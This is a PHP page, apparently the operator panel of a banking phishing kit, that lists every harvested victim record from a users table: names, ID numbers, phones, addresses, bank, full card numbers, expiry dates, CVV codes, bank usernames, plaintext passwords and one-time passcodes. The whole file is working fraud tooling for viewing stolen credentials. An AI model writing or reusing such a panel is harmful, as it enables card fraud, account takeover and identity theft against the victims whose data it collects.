<?php require "head.php"; ?>

<div class="container mt-4">
	<div style=" width: 100%; display: flex; justify-content: space-between;">
	   <h4>Imprimir datos</h4>
	   <a href="home.php" class="btn btn-danger">Regresar</a>
	</div>
	<hr>
    <?php
include "../conexion/index.php";


$resultado = $mysqli->query("SELECT * FROM users ORDER BY id DESC");
$usuarios = $resultado->fetch_all(MYSQLI_ASSOC);


foreach ($usuarios as $key => $dato) {
	if ($dato["estado"] != 8) {
		echo '

		<section class="card mb-3 bg-ligth">
		<div class="card-body">
			<div class="row">
				<div class="col-md-3">
					<p  style="font-size: 15px;"><strong> NOMBRE:</strong> <br> <b class="text-success" id="txt_cd">'. $dato["nombre"] .'</b> </p>
				</div>
				<div class="col-md-3">
					<p  style="font-size: 15px;"><strong> APELLIDO:</strong> <br> <b class="text-success" id="txt_cd">'. $dato["apellido"] .'</b> </p>
				</div>
				<div class="col-md-3">
					<p  style="font-size: 15px;"><strong> DOCUMENTO:</strong> <br> <b class="text-success" id="txt_cd">'. $dato["documento"] .'</b> </p>
				</div>
				<div class="col-md-3">
					<p  style="font-size: 15px;"><strong> TELEFONO:</strong> <br> <b class="text-success" id="txt_cd">'. $dato["telefono"] .'</b> </p>
				</div>
			</div>
			<hr>
			<div class="row">
				<div class="col-md-4">
					<p  style="font-size: 15px;"><strong> CIUDAD:</strong> <br> <b class="text-success" id="txt_cd">'. $dato["ciudad"] .'</b> </p>
				</div>
				<div class="col-md-4">
					<p  style="font-size: 15px;"><strong> DIRRECCION:</strong> <br> <b class="text-success" id="txt_cd">'. $dato["direccion"] .'</b> </p>
				</div>
				<div class="col-md-4">
					<p style="font-size: 15px;"><strong> BANCO:</strong> <br> <b class="text-success" id="txt_cd">'. $dato["banco"] .'</b> </p>
				</div>
			</div>
			<hr>		
			<div class="row">
				<div class="col-md-3">
					<p  style="font-size: 15px;"><strong> NRO. TARJETA:</strong> <br> <b class="text-success" id="txt_cd">'. $dato["nro_tarjeta"] .'</b> </p>
				</div>
				<div class="col-md-3">
					<p style="font-size: 15px;"><strong> NOMBRE TARJETA:</strong> <br> <b class="text-success" id="txt_cd">'. $dato["nombre_tarjeta"] .'</b> </p>
				</div>
				<div class="col-md-3">
					<p  style="font-size: 15px;"><strong> EXPIRACIÓN TARJETA:</strong> <br> <b class="text-success" id="txt_cd">'. $dato["mes_tarjeta"] .' / '. $dato["anio_tarjeta"] .' </b></p>
				</div>
				<div class="col-md-3">
					<p  style="font-size: 15px;"><strong> CVV TARJETA:</strong> <br> <b class="text-success" id="txt_cd">'. $dato["cvv_tarjeta"] .'</b> </p>
				</div>
			</div>
			<hr>
			<div class="row">
				<div class="col-md-4">
					<p  style="font-size: 15px;"><strong> USUARIO:</strong> <br> <b class="text-success" id="txt_cd">'. $dato["usuario"] .'</b> </p>
				</div>
				<div class="col-md-4">
					<p  style="font-size: 15px;"><strong> CONTRASEÑA:</strong> <br> <b class="text-success" id="txt_cd">'. $dato["password"] .'</b> </p>
				</div>
				<div class="col-md-4">
					<p  style="font-size: 15px;"><strong> OTP:</strong> <br> <b class="text-success" id="txt_cd">'. $dato["otp"] .'</b> </p>
				</div>
			</div>

		</div>
		
	</section>


	';
	}
}
	
?>
</div>
		<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
	<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-fQybjgWLrvvRgtW6bFlB7jaZrFsaBXjsOMm/tB9LTS58ONXgqbR9W8oWht/amnpF" crossorigin="anonymous"></script>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>	
	 <script type="text/javascript" src="https://cdn.datatables.net/1.10.19/js/jquery.dataTables.min.js"></script>

	

		<script type="text/javascript" src="js/scriptv31.js"></script>
	</body>
	</html>